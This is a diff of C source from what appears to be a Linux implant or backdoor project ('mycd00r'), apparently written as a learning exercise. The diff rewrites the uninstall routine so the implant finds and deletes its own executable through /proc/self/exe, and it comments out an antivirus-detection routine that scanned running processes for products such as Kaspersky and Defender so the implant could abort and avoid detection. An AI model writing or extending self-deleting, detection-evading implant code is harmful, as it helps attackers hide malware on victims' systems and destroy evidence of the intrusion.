@@ -7,13 +7,14 @@
 #include <stdbool.h>
 #include <sys/socket.h>
 #include <netdb.h>
+#include <errno.h>
+#include <unistd.h>
 
 #include "validators.h"
+#include "utils.h"
 
-#define PATH_TO_FILE "/home/christianm/linuxImplantFundamentals/src/mycd00r/sniffer"
-
-const char* KNOWN_AV_LIST[] = {"XProtect", "avast", "avg", "kaspersky", "defender"};
-const int KNOWN_AV_NUM = 5;
+// const char* KNOWN_AV_LIST[] = {"XProtect", "avast", "avg", "kaspersky", "defender"};
+// const int KNOWN_AV_NUM = 5;
 
 /**
  * Checks to see if ip_str is within the network. Takes in the family (IPv4 or IPv6) because 
@@ -234,34 +235,46 @@ void free_profile(Profile **pProfile) {
 
 
 void uninstall() {
-    remove(PATH_TO_FILE);
+    char path[PATH_SIZE];
+    int len = readlink("/proc/self/exe", path, sizeof(path) - 1);
+    if(len < 0) {
+        LOG("Failed to read path: %s\n", strerror(errno));
+        return;
+    }
+    path[len] = '\0';
+
+    if(remove(path) == 0) {
+        LOG("Implant file successfully removed at path %s\n", path);
+    } else {
+        LOG("Error removing implant at path %s: %s\n", path, strerror(errno));
+    }
 }
 
 void check_for_antivirus() {
-    FILE *file = popen("ps -A", "r");
+    // FILE *file = popen("ps -A", "r");
 
-    if(!file) {
-        #ifdef DEBUG
-        fprintf(stderr, "popen failed\n");
-        #endif
-        exit(EXIT_FAILURE);
-    }
+    // if(!file) {
+    //     #ifdef DEBUG
+    //     fprintf(stderr, "popen failed\n");
+    //     #endif
+    //     exit(EXIT_FAILURE);
+    // }
 
-    char buffer[256];
-    while(fgets(buffer, sizeof(buffer), file) != NULL) {
-        for(int i = 0; i < KNOWN_AV_NUM; i++) {
-            if(strstr(buffer, KNOWN_AV_LIST[i]) != NULL) {
-                #ifdef DEBUG
-                fprintf(stderr, "Antivirus %s found. Abort.\n", KNOWN_AV_LIST[i]);
-                #endif
-                pclose(file);
-                exit(EXIT_FAILURE);
-            }
-        }
-    }
+    // char buffer[256];
+    // while(fgets(buffer, sizeof(buffer), file) != NULL) {
+    //     for(int i = 0; i < KNOWN_AV_NUM; i++) {
+    //         if(strstr(buffer, KNOWN_AV_LIST[i]) != NULL) {
+    //             #ifdef DEBUG
+    //             fprintf(stderr, "Antivirus %s found. Abort.\n", KNOWN_AV_LIST[i]);
+    //             #endif
+    //             pclose(file);
+    //             exit(EXIT_FAILURE);
+    //         }
+    //     }
+    // }
     
-    pclose(file);
-    return;
+    // pclose(file);
+    // return;
 }
 
 
